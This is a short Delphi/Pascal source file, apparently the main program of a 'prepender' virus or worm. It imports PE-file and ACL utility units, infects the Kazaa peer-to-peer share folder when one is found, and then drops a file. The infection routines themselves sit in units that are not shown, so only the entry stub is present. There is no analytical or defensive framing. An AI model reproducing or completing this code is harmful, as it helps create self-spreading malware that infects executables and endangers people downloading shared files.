   program prepender;

   uses
     prep in 'prep.pas',
     AclUtils in 'ACLUnits\ACLUTILS.PAS',
     PEFile in 'PEFile.pas';

   begin
    IF KazaaDir<>'' THEN InfectKazaaDir;
    DropFile;
   end.
